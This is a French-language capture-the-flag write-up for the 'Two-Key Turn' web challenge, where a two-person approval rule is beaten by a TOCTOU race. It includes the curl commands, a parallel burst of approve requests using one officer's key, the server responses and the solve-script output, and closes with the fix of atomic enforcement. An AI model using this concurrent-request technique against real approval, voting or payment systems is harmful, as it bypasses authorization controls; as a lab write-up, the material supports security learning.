---
tags: [web, race-condition, toctou, api, authorization-bypass]
---

[🇬🇧 English](README.md) · 🇫🇷 Français

# Two-Key Turn

| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
|---|---|---|---|---|---|---|
| web | 120 | 194 | ✅ | — | 0xAr3s-root | Chronos Security |

## Énoncé

> La console d'autorisation de tir côtière de Kessara n'arme un ordre de tir que lorsque
> deux officiers DISTINCTS l'ont approuvé — la règle des deux personnes. Un insider
> hostile détient les identifiants d'un officier (VEGA-7). Un ordre est encore en attente
> d'autorisation : faites-le passer à ARMED avec votre unique identifiant et lisez son
> autorisation d'armement.
>
> L'API s'auto-documente sur `GET /schema`. Votre clé d'opérateur est
> `opk_vega7_2f4b9c17e0a3` — envoyez-la via `Authorization: Bearer <clé>`. N'interagissez
> qu'avec votre instance assignée.
>
> Format du flag : `CSCTF{...}`

**Cible :** une instance par joueur sur `http://w05.ctf.chronos-security.ro:<port>` (durée
de vie de 30 minutes).

## En bref

La vérification « une approbation par officier » de la règle des deux personnes est une
**race condition TOCTOU** classique : envoyer une rafale de requêtes
`POST /orders/{id}/approve` concurrentes avec la *même* clé d'opérateur permet à plusieurs
requêtes de lire « 0 approbation préalable » avant qu'aucune n'ait validé son propre
enregistrement. Deux d'entre elles écrivent chacune un enregistrement d'approbation pour
`VEGA-7`, `approvals` atteint `required_approvals = 2`, l'ordre passe à `ARMED`, et la
réponse contient `arming_authorization` — le flag.

## Démarche

**1. Reconnaissance — lecture du schéma auto-documenté**

```bash
curl -s http://w05.ctf.chronos-security.ro:34125/schema | jq
```

```json
{
  "authorization_model": {
    "two_person_rule": "an order arms only when TWO DISTINCT officers have each cast APPROVE (required_approvals = 2)",
    "approve": "idempotent per officer while an approval window is pending",
    "pending_ttl_seconds": 8.0,
    "concurrent_action": "an ordinary 6-8 separate-connection approval burst is supported"
  },
  "routes": {
    "GET /orders": "list fire orders and retry information",
    "GET /orders/{id}": "order detail; arming_authorization appears only after ARMED",
    "POST /orders/{id}/approve": "cast one approval on the order"
  },
  "your_officer": "VEGA-7",
  "issued_operator_credential": "opk_vega7_2f4b9c17e0a3"
}
```

Deux formulations sautent aux yeux :

- `approve` est **« idempotent per officer while an approval window is pending »** — c'est
  une description d'une *vérification*, pas une garantie sur la manière dont elle est
  implémentée.
- Le serveur annonce explicitement **supporter** « une rafale ordinaire de 6-8 approbations
  sur connexions séparées » — un indice fort, presque trop généreux, que l'envoi de
  plusieurs approbations simultanées sur des connexions distinctes est l'interaction
  attendue, et que c'est justement la gestion de la concurrence qui est testée.

**2. Trouver l'ordre cible**

```bash
curl -s http://w05.ctf.chronos-security.ro:34125/orders \
  -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3"
```

```json
{"orders":[
  {"id":"AO-7D31C9","battery":"Coastal Battery 3 (Saltmarsh)","status":"PENDING_AUTH","approvals":0,"required_approvals":2},
  {"id":"AO-19F4E2","status":"REJECTED", "...":"..."},
  {"id":"AO-A8C506","status":"EXECUTED",  "...":"..."},
  {"id":"AO-CE472A","status":"DRAFT",     "...":"..."}
]}
```

`AO-7D31C9` est le seul ordre `PENDING_AUTH` — notre cible.

**3. La race condition**

« Idempotent per officer » signifie presque toujours que le serveur fait quelque chose
comme :

```
if officer not in order.approved_by:
    order.approved_by.add(officer)
    order.approvals += 1
```

C'est un schéma classique de **lecture-vérification-puis-écriture** (TOCTOU). Si deux
requêtes du même officier arrivent en même temps sur le handler, les deux peuvent passer
le `if` (en lisant le même état « pas encore approuvé ») avant que l'une des deux ait
terminé d'écrire — chacune ajoute alors son propre enregistrement d'approbation, et
`approvals` finit par compter le *même* officier deux fois au lieu d'être plafonné à un
seul.

On envoie une rafale d'approbations concurrentes sur des connexions séparées :

```bash
for i in $(seq 1 8); do
  curl -s -X POST http://w05.ctf.chronos-security.ro:34125/orders/AO-7D31C9/approve \
    -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3" &
done
wait
```

Résultat — deux des huit requêtes passent la vérification avant que la première écriture
ne soit enregistrée :

```json
{"status":"ARMED","approvals":2,"required_approvals":2,
 "approval_records":[
   {"record_id":"APR-1-1","officer":"VEGA-7","epoch":1},
   {"record_id":"APR-1-2","officer":"VEGA-7","epoch":1}
 ],
 "arming_authorization":"CSCTF{...} (redacted)"}
```

Les deux enregistrements d'approbation appartiennent à `VEGA-7` — la règle « deux
officiers distincts » a été entièrement contournée avec un seul identifiant, simplement en
gagnant la course dans la fenêtre d'attente de 8 secondes.

Script de résolution : [`solve/solve.py`](solve/solve.py)

```bash
python3 solve/solve.py http://w05.ctf.chronos-security.ro:34125
```

```
[+] Target order: AO-7D31C9
[+] Firing 8 concurrent approve() requests (race condition)...
[+] Order status : ARMED
[+] Approvals    : 2/2
      - APR-1-1 by VEGA-7 (epoch 1)
      - APR-1-2 by VEGA-7 (epoch 1)
[+] Flag: CSCTF{...} (redacted)
```

## Flag

`CSCTF{...} (redacted)`

## Ce que j'ai appris

- Le schéma nomme presque la classe de vulnérabilité : « idempotent... while pending » est
  une garantie sur un *état*, et « concurrent action... burst is supported » est une
  invitation à tester *comment* la concurrence est gérée, pas seulement *si* elle l'est.
- C'est la même famille de bug que les races de double-dépense / double-vote dans les
  systèmes de paiement ou de vote : toute vérification « est-ce que cet acteur a déjà fait
  X ? » qui n'est pas appliquée atomiquement (contrainte d'unicité en base, compare-and-swap,
  ou verrou par ordre couvrant toute la séquence vérification-puis-incrément) peut être
  battue par des requêtes parallèles arrivant dans la même fenêtre.
- Le correctif est simple : imposer « une approbation par officier par ordre » via une
  opération atomique — contrainte unique en base sur `(order_id, officer)`,
  compare-and-swap, ou verrou par ordre couvrant toute la séquence — plutôt qu'une paire
  lecture-puis-écriture qui laisse une fenêtre pour d'autres threads/requêtes.
- Aucun contournement d'authentification n'était nécessaire : tout l'exploit n'utilise que
  l'unique identifiant fourni, en exploitant le timing plutôt que l'identité.

## Outils et références

- `curl` avec des jobs en arrière-plan (`&` / `wait`) pour une rafale HTTP concurrente simple
- `concurrent.futures.ThreadPoolExecutor` en Python pour la version scriptée
- Fondamentaux des race conditions / TOCTOU : [OWASP — Race Condition](https://owasp.org/www-community/vulnerabilities/Race_condition)

---
[⬅ Retour à l'événement](../../README.fr.md)
